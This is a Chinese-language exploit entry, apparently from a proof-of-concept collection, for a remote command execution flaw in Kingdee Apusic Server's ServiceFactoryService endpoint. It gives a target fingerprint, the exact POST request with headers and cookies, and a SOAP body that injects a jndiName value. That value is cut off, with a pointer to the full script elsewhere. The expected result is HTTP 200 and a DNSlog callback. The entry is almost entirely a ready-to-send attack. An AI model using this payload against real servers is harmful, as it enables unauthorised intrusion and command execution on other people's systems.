# 金蝶天燕ApusicServerservicefactoryservice远程命令执行漏洞

- **系统**：金蝶　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`header="Apusic"`
- **请求**：`POST /ormrpc/services/ServiceFactoryService HTTP/1.1`
- **关键头**：`Cookie: EASSESSIONID=1991346249; NAPRoutID=1991346249`　`Content-Type: application/xml`　`Soapaction: something`　`Content-Length: 732`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:buil="http://build.antlr">
<soapenv:Header/>
<soapenv:Body>
<buil:getService soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<environment xmlns:apachesoap="http://xml.apache.org/xml-soap" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xsi:type="apachesoap:Map">
<item>
<key xsi:type="soapenc:string">jndiName</key>
<value xsi:type="soapenc:string">ld…（脚本共 707 字，完整版见原文）
```
- **预期**：200　|　Dnslog回显